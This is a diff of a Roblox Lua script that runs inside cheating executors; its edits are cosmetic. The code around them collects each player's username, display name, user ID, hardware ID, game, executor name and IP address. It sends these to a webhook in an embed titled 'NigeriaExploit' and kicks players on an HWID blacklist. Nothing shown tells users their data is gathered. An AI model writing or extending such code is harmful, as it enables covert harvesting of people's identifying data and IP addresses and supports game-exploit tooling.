@@ -192,7 +192,7 @@ local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local LocalPlayer = Players.LocalPlayer
 if not LocalPlayer then
-    warn("LocalPlayer not found, script should run in a LocalScript context.")
+    warn("LocalPlayer not found. This script should run as a LocalScript.")
     return
 end
 
@@ -201,15 +201,14 @@ local DisplayName = LocalPlayer.DisplayName
 local Username = LocalPlayer.Name
 local HWID = RbxAnalyticsService:GetClientId()
 
--- Attempt to get game name, fallback to "Unknown Game"
 local GameName = "Unknown Game"
 pcall(function()
     GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 end)
 
--- A dummy GetIp function, replace with your actual IP getter if you have one
+-- Dummy IP getter; replace with your actual implementation if any
 
--- Executor detection function with safe checks
+
 local function detectExecutor()
     if syn then return "Synapse X" end
     if secure_load then return "Sentinel" end
@@ -234,8 +233,8 @@ local function detectExecutor()
     if _G.Arcade then return "Arcade" end
     if _G.Shadow then return "Shadow" end
     if _G.Potassium then return "Potassium" end
-    local success, env = pcall(getrenv)
-    if success and env then
+    local ok, env = pcall(getrenv)
+    if ok and env then
         if env.Potassium or env.executorName == "Potassium" then return "Potassium" end
     end
     if gethiddenproperty or sethiddenproperty then return "Unknown (Hidden Property Access)" end
@@ -259,7 +258,7 @@ local blacklistedHWIDs = {
 local function isBlacklisted()
     if blacklistedHWIDs[HWID] then
         warn("Blacklisted HWID detected: " .. HWID)
-        LocalPlayer:Kick("Je HWID staat op blacklist dusss ermmmmm")
+        LocalPlayer:Kick("je HWID staat op blacklist dusss ermmmmm")
         return true
     end
     return false
@@ -273,13 +272,7 @@ local function createWebhookData()
                 title = "NigeriaExploit",
                 description = string.format(
                     "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n",
-                    Username,
-                    DisplayName,
-                    UserId,
-                    HWID,
-                    GameName,
-                    executor,
-                    GetIp()
+                    Username, DisplayName, UserId, HWID, GameName, executor, GetIp()
                 ),
                 thumbnail = {
                     url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
@@ -293,10 +286,9 @@ local function createWebhookData()
 end
 
 local function sendWebhook(url, data)
-    local headers = { ["Content-Type"] = "application/json" }
+    local headers = {["Content-Type"] = "application/json"}
     local requestFunc = http_request or request or HttpPost or (syn and syn.request)
     if requestFunc then
-        -- Different exploits have different request formats:
         if syn and syn.request then
             syn.request({
                 Url = url,
@@ -319,7 +311,6 @@ local function sendWebhook(url, data)
                 Body = data
             })
         elseif HttpPost then
-            -- HttpPost is usually a function that takes URL and body separately
             HttpPost(url, data)
         else
             warn("No compatible HTTP request function found.")
